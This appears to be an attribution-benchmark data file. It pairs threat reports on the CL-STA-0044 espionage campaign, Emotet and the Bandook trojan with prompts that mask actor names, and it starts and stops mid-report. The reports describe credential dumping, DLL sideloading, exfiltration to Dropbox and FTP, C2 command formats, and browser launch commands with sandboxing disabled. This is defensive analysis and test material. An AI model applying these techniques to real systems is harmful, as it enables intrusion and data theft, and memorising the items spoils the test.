Scheduled task named TabletPCInputServices or TabletInputServices  Once the persistence component is executed as a service, it drops the other components to disk and executes the networking component.    The Networking Component  The networking component (rw32core.dll) is sideloaded into Brcc32.exe, the resource compiler of Embarcadero, an app development tool.    The networking component uses the domain www.uvfr4ep[.]com for C2 communication. Then, through the use of pipes, it communicates with the functionality component to execute commands from the C2.    The Functionality Component  The functionality component (secur32.dll) is sideloaded to Consent.exe, which is a Windows binary that the file metadata identifies as “Consent UI for administrative applications.”    Functionality component capabilities include the following:    Executing commands  File system interaction  Downloading and uploading files  Keylogging  Screen capturing  Figure 9 illustrates the process tree for the ToneShell backdoor.    Image 9 is a diagram of the ToneShell process tree. The process goes from persistence to networking to functionality.  Figure 9. ToneShell process tree.  Web Shells  In addition to maintaining access to victim environments via various backdoors, in some instances, the threat actor also maintained their access via China Chopper web shells. In one instance, one of the backdoors appeared to malfunction and crash on an infected host. To overcome that, the threat actor used their web shell access to troubleshoot the malfunctioning backdoors.    Cobalt Strike  On top of using their web shell access, the threat actor also delivered a Cobalt Strike agent to the infected host that had malfunctioning backdoors. They deployed the Cobalt Strike agent under the name libcurl.dll.    The threat actor used DLL sideloading to abuse the legitimate process GUP.exe, which is a component of Notepad++, to execute the malicious agent.    After deployment, the threat actor deleted the Cobalt Strike agent fairly quickly. This could imply that they only deployed the agent to gain additional functionality momentarily, to allow them to troubleshoot the malfunctioning backdoors.    ShadowPad  On several occasions, the threat actor behind CL-STA-0044 deployed the ShadowPad backdoor. ShadowPad is a modular malware that has been in use by multiple Chinese threat actors since at least 2015. ShadowPad is considered to be the successor of PlugX, another example of modular malware popular with Chinese threat actors.    The threat actor abused DLL sideloading to load the ShadowPad module (log.dll) into a legitimate executable (BDReinit.exe), which is a component of Bitdefender Crash Handler (renamed as net.exe) security tool. When log.dll is loaded into memory, it searches for a file named log.dll.dat that is saved in the same directory to decrypt shellcode and execute the payload.    As shown in Figure 10, ShadowPad then spawns and injects code into wmplayer.exe, which in turn spawns and injects code into dllhost.exe. Researchers from Elastic Security Labs have described this behavior in the past.    ShadowPad creates persistence using the service DataCollectionPublisingService (DapSvc) for the renamed BDReinit.exe (net.exe). Figure 10 illustrates the process tree for ShadowPad.    Image 10 is a screenshot of a diagram from Cortex XDR. The ShadowPad process tree shows the product (BitDefender), the description (BitDefender Crash Handler) and the original name (BDReinit.exe). Some information has been redacted.  Figure 10. ShadowPad process tree.  Highly Targeted and Intelligence-Driven Operation  Targeting Specific Individuals  Analysis of the threat actor’s actions suggests that the threat actor behind CL-STA-0044 has performed considerable intelligence work on their victims. In several instances, Unit 42 researchers observed threat actors using the known Lolbin utility wevtutil to gather information about specific usernames belonging to individuals who work at the victim organizations.    The threat actor searched for Windows Security Log Event ID 4624, which is an event that documents successful login attempts. They also searched for Windows Security Log Event ID 4672, which is an event that documents assignments of sensitive privileges to new login sessions.    The threat actor used these log events to find out which machines specific users of interest logged in to, to pinpoint hostnames of interest. The threat actor would later compromise these machines and gather sensitive data from them for exfiltration. Figure 11 shows wevtutil used to search for successful login attempts.    Image 11 is a screenshot of code. This is wevtutil searching for successful login attempts.  Figure 11. Wevtutil used to search for successful login attempts.  Exfiltration  Throughout this attack, the threat actor attempted to exfiltrate many documents and other sensitive information from the compromised machines. Before exfiltration, the threat actor used rar.exe to archive the files of interest.    Figure 12 shows that, on some occasions, the threat actor searched for specific file extensions. On other occasions, they archived full directories.    Image 12 is a screenshot of a diagram in Cortex XDR. It is their archive of specific file extensions. Some information has been redacted.  Figure 12. Archiving specific file extensions.  The threat actor used a variety of tools to initiate their exfiltration. On already compromised hosts, they used the ToneShell backdoor to execute rar.exe. To access other uncompromised hosts, they used tools like Impacket and RemCom to execute rar.exe remotely. RemCom is a remote shell or telnet replacement that lets you execute processes on remote Windows systems.    On hosts of interest, the threat actor created persistence for a script that is in charge of archiving files (autorun.vbs), as shown in Figure 13. To do this, they saved the VBS script in the startup directory, which causes it to run every time the machine is turned on. This behavior could indicate the threat actor’s goal of getting a continuous flow of intelligence from the victims instead of just being a one and done operation.    Image 13 is a screenshot of a diagram in Cortex XDR. It is their archive of script persistence. Some information has been redacted.  Figure 13. Archiving script persistence.  After archiving the files, we observed the threat actor using two exfiltration methods. The first method is uploading the files using curl and ftp to a cloud storage site named ftp.1fichier[.]com.    The second method observed is uploading the archived files to Dropbox, a file hosting service as shown in Figure 14. This method of exfiltration is popular with threat actors because Dropbox the service is one people often use legitimately, making malicious activity harder to detect.    Image 14 is a screenshot of many lines of code. This is how the threat actor uses data exfiltration, uploading archived files to Dropbox.  Figure 14. Data exfiltration using Dropbox.  Threat actors often abuse, take advantage of or subvert legitimate products for malicious purposes. This does not necessarily imply a flaw or malicious quality to the legitimate product being abused.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: An advanced persistent threat (APT) group suspected with moderate-high confidence to be [PLACEHOLDER] engaged in a number of cyberespionage intrusions targeting a government in Southeast Asia. The intrusions took place from at least the second quarter of 2021 to the third quarter of 2023. Based on our observations and analysis, the attackers gathered and exfiltrated sensitive documents and other types of files from compromised networks.    CL-STA-0044 Details  Reconnaissance  To better understand the breached networks, the threat actor behind CL-STA-0044 scanned infected environments to find live hosts and open ports, as well as existing domain users and domain groups.    We observed the adversary using several different tools to reach these goals:    LadonGo: LadonGo is an open-source scanning framework that Chinese-speaking developers created. The threat actor used LadonGo to scan for live hosts and open ports using commands like smbscan, pingscan and sshscan.  NBTScan: NBTScan is a program for scanning IP networks for NetBIOS name information.  AdFind: AdFind is a command-line query tool that can gather information from Active Directory. The threat actor renamed the tool a.logs.As shown in Figure 2, the threat actor saved the results of AdFind to the following filenames:  Domain_users_light.txt  Domain_computers_light.txt  Domain_groups_light.txt  These filenames have only been mentioned in a GitHub page about “Penetration Testing Methodology References.”    Image 2 is a screenshot of the Cortex XDR program. It is a diagram showing the prevention of AdFind attempts. Some information has been redacted.  Figure 2. Prevention of AdFind attempts to dump domain users’ details.  Impacket: The Impacket collection includes many tools with functions related to remote execution, Kerberos attacks, credential dumping and more. Figure 3 illustrates these commands. The threat actor used Impacket to gather information about the network, discover machines and users, and query directories on remote machines for interesting files to exfiltrate.  Image 3 is a screenshot of reconnaissance commands that were run via Impacket (Python modules). There are six commands in total and some of the information has been redacted.   Figure 3. Reconnaissance commands run via Impacket.  Credential Stealing  Unit 42 researchers observed the threat actor behind the CL-STA-0044 activity attempting to use several techniques for credential stealing to dump passwords from different hosts and the Active Directory:    Hdump: The threat actor deployed and used Hdump.exe (renamed h64.exe), which is a credential stealing utility that researchers have observed Chinese threat actors using. Threat actors used Hdump to dump credentials from memory using the -a (dump all) flag.  Figure 4 shows the help menu of Hdump:    Image 4 is a screenshot of Hdump commands. These options include items such as print, dump user hashes, dump cache hashes and the like.  Figure 4. Hdump help menu.  MimiKatz: The threat actor attempted to dump the memory of lssas.exe several times, using the credential harvesting tool MimiKatz (named l.doc) to extract users’ credentials.  DCSync: The threat actor attempted to use MimiKatz’s DCSync feature, which enables attackers to simulate a domain controller (DC), in the victim’s network to retrieve user credentials from the legitimate DC. They then saved the collected information to a file named log.txt.  Image 5 is a screenshot of the DCSync command. Some of the information has been redacted.  Figure 5. DCSync command.  Stealing the Ntds.dit File: To steal Active Directory data, the threat actor used the Vssadmin tool to create a volume shadow copy of the C:\ drive on the DC. They then retrieved the Ntds.dit file from the shadow copy, as shown in Figure 6.  The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, group membership and (most importantly) password hashes.    The threat actor also stole the SYSTEM file containing the boot key. This key is necessary to decrypt the Ntds.dit file.    Image 6 is a screenshot of commands used to steal the Ntds.dit file. There are four lines in total and some of the information has been redacted.  Figure 6. Stealing the Ntds.dit file.  Abusing Existing Antivirus Software  We observed the threat actor behind the CL-STA-0044 activity abusing existing antivirus software in compromised environments. We spotted threat actors abusing ESET’s Remote Administrator Agent to execute commands on remote hosts and to install backdoors.    They used the process ERAAgent.exe to execute BAT files with a naming pattern of C:\Windows\Temp\ra-run-command-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.bat (where xxx is replaced with random numbers and characters).    These .bat files executed reconnaissance commands and wrote additional backdoors to the disk, as shown in Figure 7. The files appear to be responsible for executing commands initiated by ESET’s Run Command task.         Image 7 is a screenshot of a tree diagram in Cortex XDR. Suspicious activity has been blocked. Some of the information has been redacted.  Figure 7. Blocked suspicious behavior performed by ERAAgent.exe.  Maintaining Access: Web Shells and Backdoors  During this campaign, the threat actor behind CL-STA-0044 used several methods to maintain a foothold in compromised environments. These methods include using multiple backdoors and web shells.    ToneShell Undocumented Variant  One of the popular backdoors the threat actor behind CL-STA-0044 used in this campaign is an undocumented variant of a piece of malware dubbed ToneShell. Trend Micro reported that [PLACEHOLDER] has used this malware.    Unlike the previously reported version of ToneShell, which uses shellcode as the payload of the malware, the new variant’s full functionality is built from three DLL components working in tandem.    Each DLL component has a different purpose:    Persistence component: in charge of persistence for the backdoor and dropping the other components to disk.  Networking component: in charge of command and control (C2) communication.  Functionality component: in charge of executing the different commands of the backdoor.  Furthermore, each component of ToneShell is loaded into a different legitimate process via DLL sideloading. Internal communication between the components is done via the use of pipes.    Comparing the undocumented variant with the previously reported shellcode variant as shown in Figure 8, there is a clear indication of overlap in the codebase and functionality, as well as in the strings. These strings are saved as stack strings in the shellcode variant.    Image 8 is a screenshot of many lines of code. The code is color-coded with light blue, blue and green portions. The different code sections starting from the top are the ToneShell ShellCode variant, and the ToneShell DLL variant. It demonstrates there there is overlap.  Figure 8. ToneShell strings overlap.  The Persistence Component  The persistence component (nw.dll, nw_elf.dll) is sideloaded into PwmTower.exe, a component of Trend Micro’s Password Manager, which is a known security tool.    The persistence component will create a different type of persistence depending on the process’ privileges. If it has sufficient rights, the persistence component will create two types of persistence:    Service named DISMsrv (Dism Images Servicing Utility Service)  Scheduled task named TabletPCInputServices or TabletInputServices  If it does not have sufficient rights, the persistence component will create another two types of persistence:    Registry run key named TabletPCInputServices or TabletInputServices  Scheduled task named TabletPCInputServices or TabletInputServices  Once the persistence component is executed as a service, it drops the other components to disk and executes the networking component.    The Networking Component  The networking component (rw32core.dll) is sideloaded into Brcc32.exe, the resource compiler of Embarcadero, an app development tool.    The networking component uses the domain www.uvfr4ep[.]com for C2 communication. Then, through the use of pipes, it communicates with the functionality component to execute commands from the C2.    The Functionality Component  The functionality component (secur32.dll) is sideloaded to Consent.exe, which is a Windows binary that the file metadata identifies as “Consent UI for administrative applications.”    Functionality component capabilities include the following:    Executing commands  File system interaction  Downloading and uploading files  Keylogging  Screen capturing  Figure 9 illustrates the process tree for the ToneShell backdoor.    Image 9 is a diagram of the ToneShell process tree. The process goes from persistence to networking to functionality.  Figure 9. ToneShell process tree.  Web Shells  In addition to maintaining access to victim environments via various backdoors, in some instances, the threat actor also maintained their access via China Chopper web shells. In one instance, one of the backdoors appeared to malfunction and crash on an infected host. To overcome that, the threat actor used their web shell access to troubleshoot the malfunctioning backdoors.    Cobalt Strike  On top of using their web shell access, the threat actor also delivered a Cobalt Strike agent to the infected host that had malfunctioning backdoors. They deployed the Cobalt Strike agent under the name libcurl.dll.    The threat actor used DLL sideloading to abuse the legitimate process GUP.exe, which is a component of Notepad++, to execute the malicious agent.    After deployment, the threat actor deleted the Cobalt Strike agent fairly quickly. This could imply that they only deployed the agent to gain additional functionality momentarily, to allow them to troubleshoot the malfunctioning backdoors.    ShadowPad  On several occasions, the threat actor behind CL-STA-0044 deployed the ShadowPad backdoor. ShadowPad is a modular malware that has been in use by multiple Chinese threat actors since at least 2015. ShadowPad is considered to be the successor of PlugX, another example of modular malware popular with Chinese threat actors.    The threat actor abused DLL sideloading to load the ShadowPad module (log.dll) into a legitimate executable (BDReinit.exe), which is a component of Bitdefender Crash Handler (renamed as net.exe) security tool. When log.dll is loaded into memory, it searches for a file named log.dll.dat that is saved in the same directory to decrypt shellcode and execute the payload.    As shown in Figure 10, ShadowPad then spawns and injects code into wmplayer.exe, which in turn spawns and injects code into dllhost.exe. Researchers from Elastic Security Labs have described this behavior in the past.    ShadowPad creates persistence using the service DataCollectionPublisingService (DapSvc) for the renamed BDReinit.exe (net.exe). Figure 10 illustrates the process tree for ShadowPad.    Image 10 is a screenshot of a diagram from Cortex XDR. The ShadowPad process tree shows the product (BitDefender), the description (BitDefender Crash Handler) and the original name (BDReinit.exe). Some information has been redacted.  Figure 10. ShadowPad process tree.  Highly Targeted and Intelligence-Driven Operation  Targeting Specific Individuals  Analysis of the threat actor’s actions suggests that the threat actor behind CL-STA-0044 has performed considerable intelligence work on their victims. In several instances, Unit 42 researchers observed threat actors using the known Lolbin utility wevtutil to gather information about specific usernames belonging to individuals who work at the victim organizations.    The threat actor searched for Windows Security Log Event ID 4624, which is an event that documents successful login attempts. They also searched for Windows Security Log Event ID 4672, which is an event that documents assignments of sensitive privileges to new login sessions.    The threat actor used these log events to find out which machines specific users of interest logged in to, to pinpoint hostnames of interest. The threat actor would later compromise these machines and gather sensitive data from them for exfiltration. Figure 11 shows wevtutil used to search for successful login attempts.    Image 11 is a screenshot of code. This is wevtutil searching for successful login attempts.  Figure 11. Wevtutil used to search for successful login attempts.  Exfiltration  Throughout this attack, the threat actor attempted to exfiltrate many documents and other sensitive information from the compromised machines. Before exfiltration, the threat actor used rar.exe to archive the files of interest.    Figure 12 shows that, on some occasions, the threat actor searched for specific file extensions. On other occasions, they archived full directories.    Image 12 is a screenshot of a diagram in Cortex XDR. It is their archive of specific file extensions. Some information has been redacted.  Figure 12. Archiving specific file extensions.  The threat actor used a variety of tools to initiate their exfiltration. On already compromised hosts, they used the ToneShell backdoor to execute rar.exe. To access other uncompromised hosts, they used tools like Impacket and RemCom to execute rar.exe remotely. RemCom is a remote shell or telnet replacement that lets you execute processes on remote Windows systems.    On hosts of interest, the threat actor created persistence for a script that is in charge of archiving files (autorun.vbs), as shown in Figure 13. To do this, they saved the VBS script in the startup directory, which causes it to run every time the machine is turned on. This behavior could indicate the threat actor’s goal of getting a continuous flow of intelligence from the victims instead of just being a one and done operation.    Image 13 is a screenshot of a diagram in Cortex XDR. It is their archive of script persistence. Some information has been redacted.  Figure 13. Archiving script persistence.  After archiving the files, we observed the threat actor using two exfiltration methods. The first method is uploading the files using curl and ftp to a cloud storage site named ftp.1fichier[.]com.    The second method observed is uploading the archived files to Dropbox, a file hosting service as shown in Figure 14. This method of exfiltration is popular with threat actors because Dropbox the service is one people often use legitimately, making malicious activity harder to detect.    Image 14 is a screenshot of many lines of code. This is how the threat actor uses data exfiltration, uploading archived files to Dropbox.  Figure 14. Data exfiltration using Dropbox.  Threat actors often abuse, take advantage of or subvert legitimate products for malicious purposes. This does not necessarily imply a flaw or malicious quality to the legitimate product being abused.
https://medium.com/@zyadlzyatsoc/comprehensive-analysis-of-emotet-malware-part-1-by-zyad-elzyat-35d5cf33a3c0	[PLACEHOLDER], a notorious name in the realm of cyber threats, has loomed large over the digital landscape since its inception in 2014. Originally identified as a banking Trojan focused on financial data theft, [PLACEHOLDER] has evolved into a highly adaptable and multifaceted malware, capable of causing widespread disruption to both individuals and organizations alike.    In this comprehensive analysis, we embark on a journey into the intricate workings of [PLACEHOLDER], meticulously dissecting its tactics, functionalities, and the imminent dangers it presents.    This initial segment of our analysis serves as a roadmap, outlining the key areas of exploration:    Email Phishing Analysis: Delving into [PLACEHOLDER]’s deceptive strategies deployed through phishing campaigns, we scrutinize the emails crafted to entice unwitting victims, laying bare the intricacies of its social engineering tactics.  Document Static and Dynamic Analysis: Employing a dual-pronged approach, we conduct static and dynamic analyses of the malicious documents disseminated by [PLACEHOLDER]. Through static analysis, we uncover insights into its structural components, while dynamic analysis reveals its behavior within controlled environments, offering invaluable insights into its modus operandi.  Malware Basic Static Analysis: Shifting our focus to the heart of [PLACEHOLDER], we meticulously dissect its code through static analysis techniques. This meticulous examination unveils its inner workings, shedding light on its functionalities and potential vulnerabilities.  Malware Dynamic Analysis: To gain a deeper understanding of [PLACEHOLDER]’s real-world impact, we subject it to dynamic analysis. By observing its interactions with the system and network within a simulated environment, we glean insights into its operational behavior and tactics.  Email Analysis  [PLACEHOLDER] primarily spreads through phishing emails. These emails often appear legitimate, containing familiar branding and enticing subjects like invoices, payment details, or shipping notifications. Clicking malicious attachments or links within these emails can infect a device with [PLACEHOLDER].    Email Contains:  Three URLs:  sara[.]buller@ottumwaschools[.]com (email address)  management@bavarianmotorcars[.]com (email address)  hxxp[://]bengalcore[.]com/Invoice-26396-reminder/ (link)  Two invoices mentioned  Explanation:    Invoice Email: An invoice email is a standard communication between a business and a customer. It details the products or services provided, along with the amount owed.  The presence of an invoice email suggests a business transaction.  The email addresses (sara[.]buller@ottumwaschools[.]com and management@bavarianmotorcars[.]com) indicate communication between:  Ottumwa Schools (likely a school district) and someone named Sara Buller.  Bavarian Motorcars (presumably a car dealership) and their management team.  I Ran The Third URL in anyrun sandbox , It appears that error content was removed , and URL Is Maliciuos , 4 Vendors Detect It  “I conducted comprehensive research, including a thorough examination of MalwareURL, Virus Total and whois , to gather intelligence on potential threats. In addition, I utilized scanning tools to analyze URLs and IP addresses, identifying Indicators of Compromise (IOCs).  i run the ms doc with olevba and oleid i found it malicuios and cotnain obfuscated vba code  I will enable editing in the file and run FakeNet-NG and Process Explorer to monitor connections and new processes triggered by enabling the macros.  I’ve identified five IP addresses that malware attempts to communicate with, I Will Scan Each One.  I’ve encountered obfuscated PowerShell code within the document. To decrypt it, I’ll utilize Cyber Chef and the Power Decoder tool  I Found Section Name .CRT ”The functions referenced in the .CRT section are usually written in C or C++ and are marked with specific compiler directives or attributes to ensure they are executed at the appropriate time during program startup or initialization.”  When running the sample, a new program pops up, which seems like a copy of the original malware. This suggests that the malware is making copies of itself  Event, \BaseNamedObjects\E689B0777 ”refers to an event object in the Windows operating system. Event objects are synchronization primitives used by programs to coordinate activities between different processes or threads. ”  Mutant, \BaseNamedObjects\M689B0777 “Make Sure The Malware Run Only Once On The Machine”  Section, \BaseNamedObjects\F932B6C7–3A20–46A0-B8A0–8894AA421973  Adding a random value to a registry key “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475”	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER], a notorious name in the realm of cyber threats, has loomed large over the digital landscape since its inception in 2014. Originally identified as a banking Trojan focused on financial data theft, [PLACEHOLDER] has evolved into a highly adaptable and multifaceted malware, capable of causing widespread disruption to both individuals and organizations alike.    In this comprehensive analysis, we embark on a journey into the intricate workings of [PLACEHOLDER], meticulously dissecting its tactics, functionalities, and the imminent dangers it presents.    This initial segment of our analysis serves as a roadmap, outlining the key areas of exploration:    Email Phishing Analysis: Delving into [PLACEHOLDER]’s deceptive strategies deployed through phishing campaigns, we scrutinize the emails crafted to entice unwitting victims, laying bare the intricacies of its social engineering tactics.  Document Static and Dynamic Analysis: Employing a dual-pronged approach, we conduct static and dynamic analyses of the malicious documents disseminated by [PLACEHOLDER]. Through static analysis, we uncover insights into its structural components, while dynamic analysis reveals its behavior within controlled environments, offering invaluable insights into its modus operandi.  Malware Basic Static Analysis: Shifting our focus to the heart of [PLACEHOLDER], we meticulously dissect its code through static analysis techniques. This meticulous examination unveils its inner workings, shedding light on its functionalities and potential vulnerabilities.  Malware Dynamic Analysis: To gain a deeper understanding of [PLACEHOLDER]’s real-world impact, we subject it to dynamic analysis. By observing its interactions with the system and network within a simulated environment, we glean insights into its operational behavior and tactics.  Email Analysis  [PLACEHOLDER] primarily spreads through phishing emails. These emails often appear legitimate, containing familiar branding and enticing subjects like invoices, payment details, or shipping notifications. Clicking malicious attachments or links within these emails can infect a device with [PLACEHOLDER].    Email Contains:  Three URLs:  sara[.]buller@ottumwaschools[.]com (email address)  management@bavarianmotorcars[.]com (email address)  hxxp[://]bengalcore[.]com/Invoice-26396-reminder/ (link)  Two invoices mentioned  Explanation:    Invoice Email: An invoice email is a standard communication between a business and a customer. It details the products or services provided, along with the amount owed.  The presence of an invoice email suggests a business transaction.  The email addresses (sara[.]buller@ottumwaschools[.]com and management@bavarianmotorcars[.]com) indicate communication between:  Ottumwa Schools (likely a school district) and someone named Sara Buller.  Bavarian Motorcars (presumably a car dealership) and their management team.  I Ran The Third URL in anyrun sandbox , It appears that error content was removed , and URL Is Maliciuos , 4 Vendors Detect It  “I conducted comprehensive research, including a thorough examination of MalwareURL, Virus Total and whois , to gather intelligence on potential threats. In addition, I utilized scanning tools to analyze URLs and IP addresses, identifying Indicators of Compromise (IOCs).  i run the ms doc with olevba and oleid i found it malicuios and cotnain obfuscated vba code  I will enable editing in the file and run FakeNet-NG and Process Explorer to monitor connections and new processes triggered by enabling the macros.  I’ve identified five IP addresses that malware attempts to communicate with, I Will Scan Each One.  I’ve encountered obfuscated PowerShell code within the document. To decrypt it, I’ll utilize Cyber Chef and the Power Decoder tool  I Found Section Name .CRT ”The functions referenced in the .CRT section are usually written in C or C++ and are marked with specific compiler directives or attributes to ensure they are executed at the appropriate time during program startup or initialization.”  When running the sample, a new program pops up, which seems like a copy of the original malware. This suggests that the malware is making copies of itself  Event, \BaseNamedObjects\E689B0777 ”refers to an event object in the Windows operating system. Event objects are synchronization primitives used by programs to coordinate activities between different processes or threads. ”  Mutant, \BaseNamedObjects\M689B0777 “Make Sure The Malware Run Only Once On The Machine”  Section, \BaseNamedObjects\F932B6C7–3A20–46A0-B8A0–8894AA421973  Adding a random value to a registry key “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475”
https://www.fortinet.com/blog/threat-research/bandook-persistent-threat-that-keeps-evolving	Bandook malware is a remote access trojan that has been continuously developed since it was first detected in 2007. It has been used in various campaigns by different threat actors over the years. FortiGuard Labs identified a new Bandook variant being distributed via a PDF file this past October. This PDF file contains a shortened URL that downloads a password-protected .7z file. After the victim extracts the malware with the password in the PDF file, the malware injects its payload into msinfo32.exe. In this article, we will briefly introduce Bandook’s behavior, provide detailed information about the modified elements of this new variant, and share some examples of the mechanism of its C2 communication.    Injector  The injector component decrypts the payload in the resource table and injects it into msinfo32.exe.    Before the injection, a registry key is created to control the behavior of the payload. The key name is the PID of msinfo32.exe, and the value contains the control code for the payload. Once executed with any argument, Bandook creates a registry key containing another control code that enables its payload to establish persistence, and it then injects the payload into a new process of msinfo32.exe. There are two registry keys, shown in Figure 1.    A variant reported in 2021 required four control codes and created four processes of explorer.exe that it injected in a single execution. This new variant uses less control code and makes a more precise division of tasks.    Payload  Figure 2 is the overview of the payload. Once injected, the payload initializes strings for the key names of registries, flags, APIs, etc. After this, it uses the PID of the injected msinfo32.exe to find the registry key and then decodes and parses the key value to perform the task specified by the control code. Figure 3 shows the relationship between the key value and the payload’s behavior. The control codes play the same role as previous variants, but strings are used instead of numbers.      The variant we found in October 2023 has two additional control codes, but its injector doesn’t create registries for them. One asks the payload to load fcd.dll, which is downloaded by another injected process and calls fcd.dll’s Init function. The other mechanism establishes persistence and executes Bandook’s copy.    These unused control codes have been removed from even newer variants (430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8ce).    Of the two remaining control codes, “ACG” is the main control code for an attack, while “GUM” establishes the persistence mechanism.    GUM Control Code  When the control code is “GUM,” Bandook drops a copy to the SMC folder in the appdata folder as “SMC.exe” or “SMC.cpl” and creates a registry key to automatically execute the copy. There are three registry keys to run SMC.exe.    Software\Microsoft\Windows\CurrentVersion\Run  Key name: SMC  Value: %APPDATA%\SMC\SMC.exe    Software\Microsoft\Windows NT\CurrentVersion\Winlogon  Key name: shell  Value: explorer.exe, %APPDATA%\SMC\SMC.exe    Software\Microsoft\Windows NT\CurrentVersion\Windows\  Key name: Load  Value: short path of %APPDATA%\SMC\SMC.exe    When the copy is SMC.cpl, the registry key and value are the following:    Software\Microsoft\Windows\CurrentVersion\Run  Key name: SMC  Value: %windir%\System32\controll.exe %APPDATA%\SMC\SMC.cpl  ACG Control Code  When the control code is ACG, the payload can download files for other modules, including fcd.dll, pcd.dll, an executable file, and others. This is an optional function based on flags set when the payload initializes. The files can also be downloaded from the C2 server when necessary. If fcd.dll is downloaded, Bandook calls its functions and passes the key names of the registry key as arguments. Similarly, many registry keys store information used in other actions.    An action may separated into several parts, and it’s necessary to piece all related commands and registry keys together. For example, C2 communication may use one command to write a registry key and a separate command to read it.    C2 Communication  First, Bandook sends victim information to its C2 server:    Figure 4: Traffic capture and AES decrypted data of the victim information.  Figure 4: Traffic capture and AES decrypted data of the victim information.  If the C2 server is available, Bandook receives commands from the server, including *DJDSR^, @0001, @0002, and so on. While the string sequence in the newest variants reaches @0155, some are only used when sending a result to the server, and others only exist in other modules. As shown in Figure 5, the payload doesn’t use the command @0133, though it can be found in fcd.dll.    Figure 5: @0133 can be found in fcd.dll.  Figure 5: @0133 can be found in fcd.dll.  Despite the numbering, the payload only supports 139 actions. In addition, some special commands are only sent to the server under specific conditions. Since most actions are the same as in previous variants, we will focus on communications between Bandook and the C2 server using the new commands added to the most recent variants.    These actions can be roughly categorized as file manipulation, registry manipulation, download, information stealing, file execution, invocation of functions in dlls from the C2, controlling the victim’s computer, process killing, and uninstalling the malware.    The data from the C2 server has the following format:    {Command}~!{Arg2}~!{Arg3}~!{Arg4}~!{Arg5}~!{Arg6}~!    The first argument is the command, which is necessary. Arg2 to Arg6 are optional.    Below are four examples of actions that require multiple commands and actions that have complex mechanisms.      This action is about file reading. If Arg3 is R, it keeps calling the Sleep function until the C2 server sends @0004 and its related arguments to Bandook. The @0004 command gives a value to determine from where to read the file or to just do nothing.    Finally, Bandook sends the file specified by Arg2 to the C2 server.    This action is about file writing. Similar to @0003, @0006 waits for @0007. @0007 determines how to write data from the C2 server to a local file.    This action executes a Python file. The main command is @0128, which calls a ShellExecute function to run a Python file {Parent directory}\Lib\dpx.pyc with arguments Arg2~Arg6. The {Parent directory} is stored in the registry key pthma under HKCU\Software. @0126 checks pthma’s value and sends the result to the server. @0127 writes its Arg2 to pthma if fcd.dll is initialized in the victim’s computer.    Additionally, some commands send special data to the server:    This action monitors the victim’s screen and controls the computer. When Bandook receives this command, it overwrites the config file of Firefox pref.js with code hard-coded in the payload and disables protection mechanisms in Microsoft Edge:      After this, Bandook creates a virtual desktop and assigns it to a newly created thread (Thread_Control) that establishes a new communication with the C2 server. It first sends the string AVE_MARIA, followed by another packet containing the number 1, to the server.    Figure 8: The “AVE_MARIA” and number sent by Bandook.  Figure 8: The “AVE_MARIA” and number sent by Bandook.  If the server responds, Bandook creates another thread to keep sending screenshots to the server. This thread also sends two packets: the string AVE_MARIA and the number 0. In the meantime, Thread_Control receives coordinates and control codes from the server. These tasks include:    Open the Run dialog  Copy user data from Chrome to another folder and open another Chrome instance using a new directory and configurations. It uses the following command to help it run faster: cmd.exe /c start chrome.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir={New folder}  Copy user data to another folder and open another Firefox instance with the copied profile  Execute Internet Explorer  Terminate Microsoft Edge, enable its Compatibility Mode, and open another Edge instance with a new directory and configurations. It uses the following command to help it run faster:  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir={New folder}  Access specified windows  In addition, there are three new commands compared to the 2021 variant:    This writes encrypted backup URLs to the registry key kPYXM under HKCU\Software\AkZhAyV0\. When the current C2 server is unavailable, Bandook will decrypt it and try to access the URLs. The format of the decrypted data will look like this:    {URL}|{URL}|{URL}|    Bandook will extract URLs and try these sequentially if the previous URL is unavailable.      This command asks Bandook to parse cookies from the browser specified by the C2, including Chrome, Edge, and Firefox, and save the result as Default.json in a .zip file.    In the previous variant, @0140 is missing. This command asks Bandook to establish a persistence mechanism with sub_13160400, also called when the control code is GUM, as shown in Figure 9.    Conclusion  This article unveils new details about the C2 mechanism of this long-existing malware and the new features in its latest variant. A large number of commands for C2 communication can be found in this malware. However, the tasks performed by its payload are fewer than the number in the command. This is because multiple commands are used for a single action, some commands call functions in other modules, and some are only used to respond to the server. Though the entire system is not observed in this attack, FortiGuard will continue monitoring malware variants and provide appropriate protections.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Bandook malware is a remote access trojan that has been continuously developed since it was first detected in 2007. It has been used in various campaigns by different threat actors over the years. FortiGuard Labs identified a new Bandook variant being distributed via a PDF file this past October. This PDF file contains a shortened URL that downloads a password-protected .7z file. After the victim extracts the malware with the password in the PDF file, the malware injects its payload into msinfo32.exe. In this article, we will briefly introduce Bandook’s behavior, provide detailed information about the modified elements of this new variant, and share some examples of the mechanism of its C2 communication.    Injector  The injector component decrypts the payload in the resource table and injects it into msinfo32.exe.    Before the injection, a registry key is created to control the behavior of the payload. The key name is the PID of msinfo32.exe, and the value contains the control code for the payload. Once executed with any argument, Bandook creates a registry key containing another control code that enables its payload to establish persistence, and it then injects the payload into a new process of msinfo32.exe. There are two registry keys, shown in Figure 1.    A variant reported in 2021 required four control codes and created four processes of explorer.exe that it injected in a single execution. This new 